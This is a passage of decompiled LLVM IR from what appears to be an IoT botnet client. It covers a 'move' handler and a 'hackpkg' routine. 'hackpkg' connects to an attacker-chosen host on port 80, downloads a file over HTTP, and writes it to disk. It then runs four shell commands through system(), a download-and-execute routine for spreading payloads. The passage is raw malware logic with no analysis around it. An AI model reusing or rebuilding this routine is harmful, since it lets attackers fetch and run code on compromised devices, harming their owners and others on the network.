  uselistorder label %dec_label_pc_1000f5a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f560, { 1, 0 }
  uselistorder label %dec_label_pc_1000f490, { 1, 0 }
  uselistorder label %dec_label_pc_1000f3ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000f3ec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000f33c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f2e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f2a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f21c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1d4, { 1, 0 }
}

define i32 @move(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000fb54 = icmp sgt i32 %arg3, 0
  br i1 %v2_1000fb54, label %dec_label_pc_1000fb7c, label %dec_label_pc_1000fb5c

dec_label_pc_1000fb5c:                            ; preds = %entry
  %v6_1000fb70 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1002c18c.739 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fb78 = call i32 @__GI_exit()
  br label %dec_label_pc_1000fb7c

dec_label_pc_1000fb7c:                            ; preds = %entry, %dec_label_pc_1000fb5c
  %v1_1000fb80 = add i32 %arg4, 4
  %v1_1000fb84 = inttoptr i32 %v1_1000fb80 to i32*
  %v2_1000fb84 = load i32, i32* %v1_1000fb84, align 4
  store i32 268499856, i32* @lr, align 4
  %v1_1000fb8c = call i32 @__GI_strdup(i32 %v2_1000fb84)
  store i32 %v1_1000fb8c, i32* @global_var_10045190.741, align 4
  store i32 1, i32* @global_var_1004514c.742, align 4
  store i32 268499888, i32* @lr, align 4
  %v1_1000fbac = call i32 @close(i32 %arg1)
  ret i32 %v1_1000fbac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb7c, { 1, 0 }
}

define i32 @hackpkg(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-303 = alloca i32, align 4
  %stack_var_-558 = alloca i32, align 4
  %stack_var_-813 = alloca i32, align 4
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-5164 = alloca i32, align 4
  %stack_var_-6196 = alloca i32, align 4
  %stack_var_-6200 = alloca i32, align 4
  %stack_var_-6204 = alloca i32, align 4
  %stack_var_-6248 = alloca i32, align 4
  %stack_var_-6188 = alloca i32, align 4
  %stack_var_-6256 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000fbc8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000fbc8, i32* %stack_var_-6256, align 4
  store i32 268499972, i32* @lr, align 4
  %v5_1000fc00 = call i32 @mkdir(i32 ptrtoint ([9 x i8]* @global_var_1002c1a8.743 to i32), i32 509, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v1_1000fc08 = call i32 @mfork(i32 %arg2)
  %v3_1000fc10 = icmp eq i32 %v1_1000fc08, 0
  br i1 %v3_1000fc10, label %dec_label_pc_1000fc18, label %dec_label_pc_10010290

dec_label_pc_1000fc18:                            ; preds = %entry
  %v2_1000fc1c = icmp sgt i32 %arg3, 1
  br i1 %v2_1000fc1c, label %dec_label_pc_1000fc44, label %dec_label_pc_1000fc24

dec_label_pc_1000fc24:                            ; preds = %dec_label_pc_1000fc18
  %v6_1000fc38 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_1002c1b4.744 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fc40 = call i32 @__GI_exit()
  br label %dec_label_pc_1000fc44

dec_label_pc_1000fc44:                            ; preds = %dec_label_pc_1000fc18, %dec_label_pc_1000fc24
  store i32 268500052, i32* @lr, align 4
  %v3_1000fc50 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_1000fc64 = icmp eq i32 %v3_1000fc50, -1
  br i1 %v4_1000fc64, label %dec_label_pc_1000fc6c, label %dec_label_pc_1000fc8c

dec_label_pc_1000fc6c:                            ; preds = %dec_label_pc_1000fc44
  %v6_1000fc80 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002a0fc.37 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fc88 = call i32 @__GI_exit()
  br label %dec_label_pc_1000fc8c

dec_label_pc_1000fc8c:                            ; preds = %dec_label_pc_1000fc44, %dec_label_pc_1000fc6c
  %v1_1000fc90 = add i32 %arg4, 4
  %v1_1000fc94 = inttoptr i32 %v1_1000fc90 to i32*
  %v2_1000fc94 = load i32, i32* %v1_1000fc94, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002a124.39 to i32), i32* @r4, align 4
  %v4_1000fca8 = inttoptr i32 %v2_1000fc94 to i8*
  %v5_1000fca8 = call i32 @__GI_strncmp(i8* %v4_1000fca8, i32 ptrtoint ([8 x i8]* @global_var_1002a124.39 to i32), i32 7)
  %v3_1000fcb0 = icmp eq i32 %v5_1000fca8, 0
  %v2_1000fcc0 = load i32, i32* %v1_1000fc94, align 4
  br i1 %v3_1000fcb0, label %dec_label_pc_1000fcb8, label %dec_label_pc_1000fcdc

dec_label_pc_1000fcb8:                            ; preds = %dec_label_pc_1000fc8c
  %v1_1000fcc4 = add i32 %v2_1000fcc0, 7
  %v2_1000fcc8 = ptrtoint i32* %stack_var_-6188 to i32
  %v2_1000fcd4 = inttoptr i32 %v1_1000fcc4 to i8*
  %v3_1000fcd4 = call i32 @strcpy(i32 %v2_1000fcc8, i8* %v2_1000fcd4)
  br label %dec_label_pc_1000fcf8

dec_label_pc_1000fcdc:                            ; preds = %dec_label_pc_1000fc8c
  %v2_1000fce8 = ptrtoint i32* %stack_var_-6188 to i32
  %v2_1000fcf4 = inttoptr i32 %v2_1000fcc0 to i8*
  %v3_1000fcf4 = call i32 @strcpy(i32 %v2_1000fce8, i8* %v2_1000fcf4)
  br label %dec_label_pc_1000fcf8

dec_label_pc_1000fcf8:                            ; preds = %dec_label_pc_1000fcb8, %dec_label_pc_1000fcdc
  %v2_1000fd14.pre-phi = phi i32 [ %v2_1000fcc8, %dec_label_pc_1000fcb8 ], [ %v2_1000fce8, %dec_label_pc_1000fcdc ]
  %v2_1000fd30 = ptrtoint i32* %stack_var_-6248 to i32
  store i32 %v2_1000fd14.pre-phi, i32* @r3, align 4
  %v0_1000fd1c68 = call i32 @__GI_strlen()
  %v2_1000fd2470 = icmp eq i32 %v0_1000fd1c68, 0
  br i1 %v2_1000fd2470, label %dec_label_pc_1000fd10.dec_label_pc_1000fd48_crit_edge, label %dec_label_pc_1000fd2c

dec_label_pc_1000fd04:                            ; preds = %dec_label_pc_1000fd2c
  %v1_1000fd08 = add i32 %storemerge573, 1
  store i32 %v2_1000fd14.pre-phi, i32* @r3, align 4
  %v0_1000fd1c = call i32 @__GI_strlen()
  %v2_1000fd24 = icmp ult i32 %v1_1000fd08, %v0_1000fd1c
  br i1 %v2_1000fd24, label %dec_label_pc_1000fd2c, label %dec_label_pc_1000fd10.dec_label_pc_1000fd48_crit_edge

dec_label_pc_1000fd10.dec_label_pc_1000fd48_crit_edge: ; preds = %dec_label_pc_1000fcf8, %dec_label_pc_1000fd04
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_1000fcf8 ], [ %v1_1000fd08, %dec_label_pc_1000fd04 ]
  %.pre29 = add i32 %storemerge5.lcssa, %v2_1000fd30
  %.pre30 = add i32 %.pre29, 60
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1000fd48

dec_label_pc_1000fd2c:                            ; preds = %dec_label_pc_1000fcf8, %dec_label_pc_1000fd04
  %storemerge573 = phi i32 [ %v1_1000fd08, %dec_label_pc_1000fd04 ], [ 0, %dec_label_pc_1000fcf8 ]
  %v2_1000fd34 = add i32 %storemerge573, %v2_1000fd30
  %v1_1000fd38 = add i32 %v2_1000fd34, 60
  %v2_1000fd38 = inttoptr i32 %v1_1000fd38 to i8*
  %v3_1000fd38 = load i8, i8* %v2_1000fd38, align 1
  %v3_1000fd40 = icmp eq i8 %v3_1000fd38, 47
  br i1 %v3_1000fd40, label %dec_label_pc_1000fd48, label %dec_label_pc_1000fd04

dec_label_pc_1000fd48:                            ; preds = %dec_label_pc_1000fd2c, %dec_label_pc_1000fd10.dec_label_pc_1000fd48_crit_edge
  %storemerge567 = phi i32 [ %storemerge5.lcssa, %dec_label_pc_1000fd10.dec_label_pc_1000fd48_crit_edge ], [ %storemerge573, %dec_label_pc_1000fd2c ]
  %v4_1000fd58.pre-phi = phi i8* [ %.pre31, %dec_label_pc_1000fd10.dec_label_pc_1000fd48_crit_edge ], [ %v2_1000fd38, %dec_label_pc_1000fd2c ]
  store i8 0, i8* %v4_1000fd58.pre-phi, align 1
  store i32 2, i32* %stack_var_-6204, align 4
  store i32 80, i32* @r3, align 4
  %v1_1000fd68 = call i32 @htons(i32 80)
  store i32 268500352, i32* @lr, align 4
  %v1_1000fd7c = call i32 @inet_addr(i32 %v2_1000fd14.pre-phi)
  %v4_1000fd90 = icmp eq i32 %v1_1000fd7c, -1
  br i1 %v4_1000fd90, label %dec_label_pc_1000fd98, label %dec_label_pc_1000fe0c

dec_label_pc_1000fd98:                            ; preds = %dec_label_pc_1000fd48
  store i32 268500388, i32* @lr, align 4
  %v1_1000fda0 = call i32 @__GI_gethostbyname(i32 %v2_1000fd14.pre-phi)
  %v3_1000fdb0 = icmp eq i32 %v1_1000fda0, 0
  br i1 %v3_1000fdb0, label %dec_label_pc_1000fdb8, label %dec_label_pc_1000fdd8

dec_label_pc_1000fdb8:                            ; preds = %dec_label_pc_1000fd98
  %v6_1000fdcc = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a12c.42 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fdd4 = call i32 @__GI_exit()
  br label %dec_label_pc_1000fdd8

dec_label_pc_1000fdd8:                            ; preds = %dec_label_pc_1000fd98, %dec_label_pc_1000fdb8
  %v2_1000fddc = ptrtoint i32* %stack_var_-6200 to i32
  %v1_1000fde4 = add i32 %v1_1000fda0, 16
  %v2_1000fde4 = inttoptr i32 %v1_1000fde4 to i32*
  %v3_1000fde4 = load i32, i32* %v2_1000fde4, align 4
  %v1_1000fde8 = inttoptr i32 %v3_1000fde4 to i32*
  %v2_1000fde8 = load i32, i32* %v1_1000fde8, align 4
  store i32 %v2_1000fde8, i32* %r11.global-to-local, align 4
  %v1_1000fdf0 = add i32 %v1_1000fda0, 12
  %v2_1000fdf0 = inttoptr i32 %v1_1000fdf0 to i32*
  %v3_1000fdf0 = load i32, i32* %v2_1000fdf0, align 4
  store i32 %v2_1000fddc, i32* @r3, align 4
  store i32 %v2_1000fde8, i32* @r4, align 4
  store i32 %v3_1000fdf0, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000fe08.752 to i32), i32* @lr, align 4
  %v0_1000fe04 = call i32 @memcpy()
  br label %dec_label_pc_1000fe14

dec_label_pc_1000fe0c:                            ; preds = %dec_label_pc_1000fd48
  store i32 %v1_1000fd7c, i32* %stack_var_-6200, align 4
  br label %dec_label_pc_1000fe14

dec_label_pc_1000fe14:                            ; preds = %dec_label_pc_1000fdd8, %dec_label_pc_1000fe0c
  %v2_1000fe14.pre-phi = ptrtoint i32* %stack_var_-6204 to i32
  %v2_1000fe18 = ptrtoint i32* %stack_var_-6196 to i32
  store i32 %v2_1000fe18, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268500524, i32* @lr, align 4
  %v0_1000fe28 = call i32 @__GI_memset()
  store i32 268500544, i32* @lr, align 4
  %v3_1000fe3c = call i32 @connect(i32 %v3_1000fc50, i32 %v2_1000fe14.pre-phi, i32 16)
  %v3_1000fe44 = icmp eq i32 %v3_1000fe3c, 0
  br i1 %v3_1000fe44, label %dec_label_pc_1000fe6c, label %dec_label_pc_1000fe4c

dec_label_pc_1000fe4c:                            ; preds = %dec_label_pc_1000fe14
  %v6_1000fe60 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a154.46 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000fe68 = call i32 @__GI_exit()
  br label %dec_label_pc_1000fe6c

dec_label_pc_1000fe6c:                            ; preds = %dec_label_pc_1000fe14, %dec_label_pc_1000fe4c
  %v2_1000fe74 = add i32 %v2_1000fd14.pre-phi, 1
  %v1_1000fe78 = add i32 %v2_1000fe74, %storemerge567
  store i32 %v2_1000fd14.pre-phi, i32* %r11.global-to-local, align 4
  %v6_1000fe98 = call i32 @Send(i32 %v3_1000fc50, i32 ptrtoint ([277 x i8]* @global_var_1002c1dc.754 to i32), i32 %v1_1000fe78, i32 %v2_1000fd14.pre-phi)
  %v6_1000feb0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002a290.49 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v1_1000feb8 = add i32 %arg4, 8
  %v1_1000febc = inttoptr i32 %v1_1000feb8 to i32*
  %v2_1000febc = load i32, i32* %v1_1000febc, align 4
  store i32 268500688, i32* @lr, align 4
  %v3_1000fecc = call i32 @__GI_fopen(i32 %v2_1000febc, i32 ptrtoint ([3 x i8]* @global_var_1002a2ac.50 to i32))
  %v2_1000fed8 = ptrtoint i32* %stack_var_-5164 to i32
  br label %dec_label_pc_1000fed8

dec_label_pc_1000fed8:                            ; preds = %dec_label_pc_10010034, %dec_label_pc_1000fe6c
  store i32 268500720, i32* @lr, align 4
  %v4_1000feec = call i32 @recv(i32 %v3_1000fc50, i32 %v2_1000fed8, i32 4096, i32 0)
  %tmp61 = icmp slt i32 %v4_1000feec, 1
  br i1 %tmp61, label %dec_label_pc_10010054, label %dec_label_pc_1000ff04

dec_label_pc_1000ff04:                            ; preds = %dec_label_pc_1000fed8
  %v2_1000ff08 = icmp sgt i32 %v4_1000feec, 4095
  br i1 %v2_1000ff08, label %dec_label_pc_1000ff30.lr.ph, label %dec_label_pc_1000ff10

dec_label_pc_1000ff10:                            ; preds = %dec_label_pc_1000ff04
  %v2_1000ff18 = add i32 %v4_1000feec, %v2_1000fd30
  %v3_1000ff20 = add i32 %v2_1000ff18, 1084
  %v4_1000ff20 = inttoptr i32 %v3_1000ff20 to i8*
  store i8 0, i8* %v4_1000ff20, align 1
  br label %dec_label_pc_1000ff30.lr.ph

dec_label_pc_1000ff30.lr.ph:                      ; preds = %dec_label_pc_1000ff10, %dec_label_pc_1000ff04
  br label %dec_label_pc_1000ff30

dec_label_pc_1000ff30:                            ; preds = %dec_label_pc_1000ff30.lr.ph, %dec_label_pc_10010034
  %storemerge625 = phi i32 [ 0, %dec_label_pc_1000ff30.lr.ph ], [ %v1_10010038, %dec_label_pc_10010034 ]
  %v2_1000ff3c = add i32 %storemerge625, %v2_1000fed8
  store i32 ptrtoint ([5 x i8]* @global_var_1002a2b0.51 to i32), i32* @r4, align 4
  %v4_1000ff50 = inttoptr i32 %v2_1000ff3c to i8*
  %v5_1000ff50 = call i32 @__GI_strncmp(i8* %v4_1000ff50, i32 ptrtoint ([5 x i8]* @global_var_1002a2b0.51 to i32), i32 4)
  %v3_1000ff58 = icmp eq i32 %v5_1000ff50, 0
  br i1 %v3_1000ff58, label %dec_label_pc_1000ff60, label %dec_label_pc_10010034

dec_label_pc_1000ff60:                            ; preds = %dec_label_pc_1000ff30
  %v1_1000ff64 = add i32 %storemerge625, 4
  %v2_1001002818 = icmp slt i32 %v1_1000ff64, %v4_1000feec
  br i1 %v2_1001002818, label %dec_label_pc_1000ff70.lr.ph, label %dec_label_pc_10010054

dec_label_pc_1000ff70.lr.ph:                      ; preds = %dec_label_pc_1000ff60
  %v1_1000ff7c = add i32 %v3_1000fecc, 52
  %v2_1000ff7c = inttoptr i32 %v1_1000ff7c to i32*
  %v1_1000ff8c = add i32 %v3_1000fecc, 16
  %v2_1000ff8c = inttoptr i32 %v1_1000ff8c to i32*
  %v1_1000ff94 = add i32 %v3_1000fecc, 28
  %v2_1000ff94 = inttoptr i32 %v1_1000ff94 to i32*
  br label %dec_label_pc_1000ff70

dec_label_pc_1000ff70:                            ; preds = %dec_label_pc_1000ff70.lr.ph, %dec_label_pc_10010014
  %storemerge721 = phi i32 [ %v1_1000ff64, %dec_label_pc_1000ff70.lr.ph ], [ %v1_10010018, %dec_label_pc_10010014 ]
  %v3_1000ff7c = load i32, i32* %v2_1000ff7c, align 4
  %v3_1000ff80 = icmp eq i32 %v3_1000ff7c, 0
  br i1 %v3_1000ff80, label %dec_label_pc_1000fff4, label %dec_label_pc_1000ff88

dec_label_pc_1000ff88:                            ; preds = %dec_label_pc_1000ff70
  %v3_1000ff8c = load i32, i32* %v2_1000ff8c, align 4
  store i32 %v3_1000ff8c, i32* %r11.global-to-local, align 4
  %v3_1000ff94 = load i32, i32* %v2_1000ff94, align 4
  %v2_1000ff98 = icmp ult i32 %v3_1000ff8c, %v3_1000ff94
  br i1 %v2_1000ff98, label %dec_label_pc_1000ffa0, label %dec_label_pc_1000ffd0

dec_label_pc_1000ffa0:                            ; preds = %dec_label_pc_1000ff88
  %v3_1000ffa4 = load i32, i32* %v2_1000ff8c, align 4
  store i32 %v3_1000ffa4, i32* %r11.global-to-local, align 4
  %v2_1000ffb0 = add i32 %storemerge721, %v2_1000fd30
  %v1_1000ffb4 = add i32 %v2_1000ffb0, 1084
  %v2_1000ffb4 = inttoptr i32 %v1_1000ffb4 to i8*
  %v3_1000ffb4 = load i8, i8* %v2_1000ffb4, align 1
  %v3_1000ffbc = inttoptr i32 %v3_1000ffa4 to i8*
  store i8 %v3_1000ffb4, i8* %v3_1000ffbc, align 1
  %v0_1000ffc0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ffc0 = add i32 %v0_1000ffc0, 1
  store i32 %v1_1000ffc0, i32* %v2_1000ff8c, align 4
  br label %dec_label_pc_10010014

dec_label_pc_1000ffd0:                            ; preds = %dec_label_pc_1000ff88
  %v2_1000ffd8 = add i32 %storemerge721, %v2_1000fd30
  %v1_1000ffdc = add i32 %v2_1000ffd8, 1084
  %v2_1000ffdc = inttoptr i32 %v1_1000ffdc to i8*
  %v3_1000ffdc = load i8, i8* %v2_1000ffdc, align 1
  store i32 ptrtoint (i32* @global_var_1000fff0.755 to i32), i32* @lr, align 4
  %v4_1000ffec = call i32 @putc_unlocked(i8 %v3_1000ffdc, i32 %v3_1000fecc, i32 %v2_1000ffd8)
  br label %dec_label_pc_10010014

dec_label_pc_1000fff4:                            ; preds = %dec_label_pc_1000ff70
  %v2_1000fffc = add i32 %storemerge721, %v2_1000fd30
  %v1_10010000 = add i32 %v2_1000fffc, 1084
  %v2_10010000 = inttoptr i32 %v1_10010000 to i8*
  %v3_10010000 = load i8, i8* %v2_10010000, align 1
  store i32 268501012, i32* @lr, align 4
  %v4_10010010 = call i32 @__GI_fputc(i8 %v3_10010000, i32 %v3_1000fecc, i32 %v2_1000fffc)
  br label %dec_label_pc_10010014

dec_label_pc_10010014:                            ; preds = %dec_label_pc_1000ffd0, %dec_label_pc_1000ffa0, %dec_label_pc_1000fff4
  %v1_10010018 = add i32 %storemerge721, 1
  %v2_10010028 = icmp slt i32 %v1_10010018, %v4_1000feec
  br i1 %v2_10010028, label %dec_label_pc_1000ff70, label %dec_label_pc_10010054

dec_label_pc_10010034:                            ; preds = %dec_label_pc_1000ff30
  %v1_10010038 = add nuw nsw i32 %storemerge625, 1
  %v2_10010048 = icmp slt i32 %v1_10010038, %v4_1000feec
  br i1 %v2_10010048, label %dec_label_pc_1000ff30, label %dec_label_pc_1000fed8

dec_label_pc_10010054:                            ; preds = %dec_label_pc_1000fed8, %dec_label_pc_10010014, %dec_label_pc_1000ff60
  %v2_1001005c = load i32, i32* %v1_1000febc, align 4
  %v6_10010078 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002c2f4.756 to i32), i32 %arg2, i32 %v2_1001005c)
  %v1_100100e0 = add i32 %v3_1000fecc, 52
  %v2_100100e0 = inttoptr i32 %v1_100100e0 to i32*
  %v1_100100f0 = add i32 %v3_1000fecc, 16
  %v2_100100f0 = inttoptr i32 %v1_100100f0 to i32*
  %v1_100100f8 = add i32 %v3_1000fecc, 28
  %v2_100100f8 = inttoptr i32 %v1_100100f8 to i32*
  br label %dec_label_pc_1001007c

dec_label_pc_1001007c:                            ; preds = %dec_label_pc_10010178, %dec_label_pc_10010054
  store i32 268501140, i32* @lr, align 4
  %v4_10010090 = call i32 @recv(i32 %v3_1000fc50, i32 %v2_1000fed8, i32 4096, i32 0)
  %tmp62 = icmp slt i32 %v4_10010090, 1
  br i1 %tmp62, label %dec_label_pc_10010198, label %dec_label_pc_100100a8

dec_label_pc_100100a8:                            ; preds = %dec_label_pc_1001007c
  %v2_100100ac = icmp sgt i32 %v4_10010090, 4095
  br i1 %v2_100100ac, label %dec_label_pc_100100d4.lr.ph, label %dec_label_pc_100100b4

dec_label_pc_100100b4:                            ; preds = %dec_label_pc_100100a8
  %v2_100100bc = add i32 %v4_10010090, %v2_1000fd30
  %v3_100100c4 = add i32 %v2_100100bc, 1084
  %v4_100100c4 = inttoptr i32 %v3_100100c4 to i8*
  store i8 0, i8* %v4_100100c4, align 1
  br label %dec_label_pc_100100d4.lr.ph

dec_label_pc_100100d4.lr.ph:                      ; preds = %dec_label_pc_100100b4, %dec_label_pc_100100a8
  br label %dec_label_pc_100100d4

dec_label_pc_100100d4:                            ; preds = %dec_label_pc_100100d4.lr.ph, %dec_label_pc_10010178
  %storemerge817 = phi i32 [ 0, %dec_label_pc_100100d4.lr.ph ], [ %v1_1001017c, %dec_label_pc_10010178 ]
  store i32 %v3_1000fecc, i32* %stack_var_-6248, align 4
  %v3_100100e0 = load i32, i32* %v2_100100e0, align 4
  %v3_100100e4 = icmp eq i32 %v3_100100e0, 0
  br i1 %v3_100100e4, label %dec_label_pc_10010158, label %dec_label_pc_100100ec

dec_label_pc_100100ec:                            ; preds = %dec_label_pc_100100d4
  %v3_100100f0 = load i32, i32* %v2_100100f0, align 4
  store i32 %v3_100100f0, i32* %r11.global-to-local, align 4
  %v3_100100f8 = load i32, i32* %v2_100100f8, align 4
  %v2_100100fc = icmp ult i32 %v3_100100f0, %v3_100100f8
  br i1 %v2_100100fc, label %dec_label_pc_10010104, label %dec_label_pc_10010134

dec_label_pc_10010104:                            ; preds = %dec_label_pc_100100ec
  %v3_10010108 = load i32, i32* %v2_100100f0, align 4
  store i32 %v3_10010108, i32* %r11.global-to-local, align 4
  %v2_10010114 = add i32 %storemerge817, %v2_1000fd30
  %v1_10010118 = add i32 %v2_10010114, 1084
  %v2_10010118 = inttoptr i32 %v1_10010118 to i8*
  %v3_10010118 = load i8, i8* %v2_10010118, align 1
  %v3_10010120 = inttoptr i32 %v3_10010108 to i8*
  store i8 %v3_10010118, i8* %v3_10010120, align 1
  %v0_10010124 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010124 = add i32 %v0_10010124, 1
  %v3_10010128 = load i32, i32* %stack_var_-6248, align 4
  %v2_1001012c = add i32 %v3_10010128, 16
  %v3_1001012c = inttoptr i32 %v2_1001012c to i32*
  store i32 %v1_10010124, i32* %v3_1001012c, align 4
  br label %dec_label_pc_10010178

dec_label_pc_10010134:                            ; preds = %dec_label_pc_100100ec
  %v2_1001013c = add i32 %storemerge817, %v2_1000fd30
  %v1_10010140 = add i32 %v2_1001013c, 1084
  %v2_10010140 = inttoptr i32 %v1_10010140 to i8*
  %v3_10010140 = load i8, i8* %v2_10010140, align 1
  store i32 ptrtoint (i32* @global_var_10010154.757 to i32), i32* @lr, align 4
  %v4_10010150 = call i32 @putc_unlocked(i8 %v3_10010140, i32 %v3_1000fecc, i32 %v2_1001013c)
  br label %dec_label_pc_10010178

dec_label_pc_10010158:                            ; preds = %dec_label_pc_100100d4
  %v2_10010160 = add i32 %storemerge817, %v2_1000fd30
  %v1_10010164 = add i32 %v2_10010160, 1084
  %v2_10010164 = inttoptr i32 %v1_10010164 to i8*
  %v3_10010164 = load i8, i8* %v2_10010164, align 1
  store i32 268501368, i32* @lr, align 4
  %v4_10010174 = call i32 @__GI_fputc(i8 %v3_10010164, i32 %v3_1000fecc, i32 %v2_10010160)
  br label %dec_label_pc_10010178

dec_label_pc_10010178:                            ; preds = %dec_label_pc_10010134, %dec_label_pc_10010104, %dec_label_pc_10010158
  %v1_1001017c = add nuw nsw i32 %storemerge817, 1
  %v2_1001018c = icmp slt i32 %v1_1001017c, %v4_10010090
  br i1 %v2_1001018c, label %dec_label_pc_100100d4, label %dec_label_pc_1001007c

dec_label_pc_10010198:                            ; preds = %dec_label_pc_1001007c
  store i32 268501408, i32* @lr, align 4
  %v1_1001019c = inttoptr i32 %v3_1000fecc to i16*
  %v2_1001019c = call i32 @__GI_fclose(i16* %v1_1001019c)
  store i32 268501416, i32* @lr, align 4
  %v1_100101a4 = call i32 @close(i32 %v3_1000fc50)
  %v2_100101b0 = load i32, i32* %v1_1000febc, align 4
  store i32 %v2_100101b0, i32* %r11.global-to-local, align 4
  %v2_100101c0 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_100101c0, i32* @r3, align 4
  store i32 268501472, i32* @lr, align 4
  %v1_100101dc = call i32 @sprintf(i32 %v2_100101c0)
  store i32 268501484, i32* @lr, align 4
  %v1_100101e8 = call i32 @system(i32 %v2_100101c0)
  %v2_100101f4 = load i32, i32* %v1_1000febc, align 4
  store i32 %v2_100101f4, i32* %r11.global-to-local, align 4
  %v2_100101f8 = ptrtoint i32* %stack_var_-813 to i32
  store i32 %v2_100101f8, i32* @r3, align 4
  store i32 268501524, i32* @lr, align 4
  %v1_10010210 = call i32 @sprintf(i32 %v2_100101f8)
  store i32 268501536, i32* @lr, align 4
  %v1_1001021c = call i32 @system(i32 %v2_100101f8)
  %v2_10010228 = load i32, i32* %v1_1000febc, align 4
  store i32 %v2_10010228, i32* %r11.global-to-local, align 4
  %v2_1001022c = ptrtoint i32* %stack_var_-558 to i32
  store i32 %v2_1001022c, i32* @r3, align 4
  store i32 268501576, i32* @lr, align 4
  %v1_10010244 = call i32 @sprintf(i32 %v2_1001022c)
  store i32 268501588, i32* @lr, align 4
  %v1_10010250 = call i32 @system(i32 %v2_1001022c)
  %v2_1001025c = load i32, i32* %v1_1000febc, align 4
  store i32 %v2_1001025c, i32* %r11.global-to-local, align 4
  %v2_10010260 = ptrtoint i32* %stack_var_-303 to i32
  store i32 %v2_10010260, i32* @r3, align 4
  store i32 268501628, i32* @lr, align 4
  %v1_10010278 = call i32 @sprintf(i32 %v2_10010260)
  store i32 ptrtoint ([3 x i8]* @global_var_10010288.762 to i32), i32* @lr, align 4
  %v1_10010284 = call i32 @system(i32 %v2_10010260)
  %v0_1001028c = call i32 @__GI_exit()
  br label %dec_label_pc_10010290

dec_label_pc_10010290:                            ; preds = %entry, %dec_label_pc_10010198
  %v0_100102a8 = phi i32 [ %v1_1000fc08, %entry ], [ %v0_1001028c, %dec_label_pc_10010198 ]
  %v2_10010290 = load i32, i32* %stack_var_-6256, align 4
  store i32 %v2_10010290, i32* %r11.global-to-local, align 4
  ret i32 %v0_100102a8

; uselistorder directives
  uselistorder i32 %v2_10010260, { 1, 0, 2 }
  uselistorder i32 %v2_1001022c, { 1, 0, 2 }
  uselistorder i32 %v2_100101f8, { 1, 0, 2 }
  uselistorder i32 %v2_100101c0, { 1, 0, 2 }
  uselistorder i32 %storemerge817, { 3, 0, 1, 2 }
  uselistorder i32 %v4_10010090, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge721, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge625, { 2, 0, 1 }
  uselistorder i32 %v4_1000feec, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000fed8, { 1, 0, 2 }
  uselistorder i32 %v3_1000fecc, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge573, { 0, 2, 1 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000fd08, { 2, 1, 0 }
  uselistorder i32 %v2_1000fd14.pre-phi, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1002a2b0.51 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 4095, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1002a124.39 to i32), { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_10010290, { 1, 0 }
  uselistorder label %dec_label_pc_10010178, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100100d4, { 1, 0 }
  uselistorder label %dec_label_pc_10010054, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10010014, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ff70, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff30, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe14, { 1, 0 }
  uselistorder label %dec_label_pc_1000fdd8, { 1, 0 }
